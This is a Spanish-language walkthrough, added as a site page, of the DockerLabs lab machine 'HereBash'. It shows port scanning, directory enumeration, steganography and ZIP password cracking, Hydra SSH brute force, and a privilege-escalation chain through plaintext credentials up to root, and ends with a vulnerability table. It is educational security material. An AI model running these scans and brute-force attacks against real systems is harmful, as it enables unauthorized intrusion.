@@ -1,0 +1,245 @@
+---
+title: HereBash
+description: Resolución completa de la máquina virtual *HereBash* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **HereBash**, desarrollada por *firstatack* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con una imagen que contiene datos ocultos mediante esteganografía. Tras extraer la información y crackear un archivo ZIP, se obtiene una contraseña que, mediante fuerza bruta SSH, permite acceder como `rosa`.
+Una vez dentro, se encadena una escalada progresiva a través de múltiples usuarios: `rosa` → `pedro` mediante un archivo con credenciales diferentes, `pedro` → `juan` mediante un archivo en `/var/mail`, y `juan` → `root` mediante credenciales encontradas en `.bashrc`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'HereBash',
+    Autor: 'firstatack',
+    Dificultad: 'Media',
+    Fecha: '20/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip HereBash.zip
+sudo bash auto_deploy.sh HereBash.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p HereBash/{content,exploits,nmap,scripts}
+cd HereBash
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1765863328/Ports_uxc3yr.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1765996926/Feroxbuster_sidiy6.png)
+
+**Rutas relevantes:**
+- `/index` — Página por defecto de Apache.
+- `/uploads` — Directorio accesible públicamente.
+- `/scripts/put.js` — Responde a peticiones PUT con "spongebob".
+- `/spongebob/upload/ohnorecallwin.jpg` — Imagen con posible contenido oculto.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Esteganografía
+
+Se descarga la imagen y se analiza con `stegseek`:
+
+```bash
+stegseek --crack ohnorecallwin.jpg /usr/share/wordlists/rockyou.txt
+```
+
+Se extrae un archivo ZIP.
+
+### 2.2 Crackeo del ZIP
+
+```bash
+zip2john ohnorecallwin.jpg.out > zip_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
+```
+
+![John](https://res.cloudinary.com/dewqswzke/image/upload/v1765996926/John_rjprtm.png)
+
+Se descomprime y se obtiene `secreto.txt` con una contraseña.
+
+### 2.3 Fuerza bruta SSH
+
+Con la contraseña obtenida, se realiza fuerza bruta para encontrar el usuario:
+
+```bash
+hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p 'frodo' -t 64 ssh://172.17.0.2 -I -f
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1765996926/Hydra_i66cex.png)
+
+Se obtiene acceso como `rosa:frodo`:
+
+```bash
+ssh rosa@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1765996930/SSH_upqm0t.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De rosa → pedro
+
+En el home de `rosa` hay un directorio `-` con un script `creararch.sh` y archivos generados. Se encuentra un archivo con credenciales diferentes:
+
+```bash
+find . -type f -exec grep -L 'xxxxxx:xxxxxx' {} \;
+```
+
+Se extrae: `pedro:alicia`.
+
+```bash
+su pedro
+```
+
+![Pedro](https://res.cloudinary.com/dewqswzke/image/upload/v1765996930/Pedro_sh7y6q.png)
+
+### 3.2 De pedro → juan
+
+Se encuentra un archivo oculto `.misecreto` con una pista:
+
+![Misecreto](https://res.cloudinary.com/dewqswzke/image/upload/v1765996930/Misecreto_x91n8r.png)
+
+Se buscan archivos propiedad de `pedro`:
+
+```bash
+find / -user pedro 2>/dev/null
+```
+
+![Find Juan](https://res.cloudinary.com/dewqswzke/image/upload/v1765996926/FindJuan_blzarp.png)
+
+Se lee `/var/mail/.pass_juan`: `juan:p4t4t4s`.
+
+```bash
+su juan
+```
+
+![Juan](https://res.cloudinary.com/dewqswzke/image/upload/v1765996926/Juan_v8jzrx.png)
+
+### 3.3 De juan → root
+
+Se encuentra un archivo `.ordenes_nuevas` con instrucciones:
+
+![Ordenes Nuevas](https://res.cloudinary.com/dewqswzke/image/upload/v1765996930/OrdenesNuevas_vcpvse.png)
+
+Se revisa `.bashrc`:
+
+```bash
+grep -i "eljefe\|password\|pass" ~/.bashrc
+```
+
+Se obtiene: `root:eljefe123`.
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1765996930/OrdenesNuevas_vcpvse.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Contenido sensible en imágenes sin protección adecuada",
+      severity: "Alta",
+      impact: "Exposición de credenciales mediante esteganografía"
+    },
+    {
+      vulnerability: "Archivos ZIP con contraseñas débiles",
+      severity: "Media",
+      impact: "Acceso a información sensible"
+    },
+    {
+      vulnerability: "Contraseñas SSH débiles y reutilizadas",
+      severity: "Alta",
+      impact: "Acceso inicial al sistema"
+    },
+    {
+      vulnerability: "Credenciales en texto plano en archivos del sistema",
+      severity: "Crítica",
+      impact: "Escalada de privilegios entre usuarios"
+    },
+    {
+      vulnerability: "Credenciales en archivos de configuración de shell",
+      severity: "Alta",
+      impact: "Escalada vertical a root"
+    }
+  ]}
+/>
